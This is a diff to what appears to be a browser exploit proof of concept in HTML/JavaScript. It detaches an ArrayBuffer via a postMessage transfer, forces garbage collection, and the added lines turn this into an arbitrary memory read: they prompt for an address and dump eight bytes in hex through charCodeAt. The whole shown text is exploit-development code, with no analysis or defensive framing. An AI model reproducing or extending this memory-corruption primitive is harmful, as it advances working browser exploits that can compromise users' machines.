@@ -1,6 +1,6 @@
 
 <script>
-alert("start");
+alert("start1");
 function neuter(ab) {
     postMessage("", "*", [ab]);
 }
@@ -46,7 +46,15 @@ function myfunc(){
 //alert("to trigger");
 gc();
 eval("x.replace(/\\d/g, y)");
-alert(y);
+alert("ok");
+var a=prompt("addr");
+a=a/2;
+var b;
+for(var i=0;i<0x8;i++){
+ b+=y.charCodeAt(a+i).toString(16);
+ b+=" ";
+}
+alert(b);
 alert("end");
 }
 setTimeout(myfunc,6000);
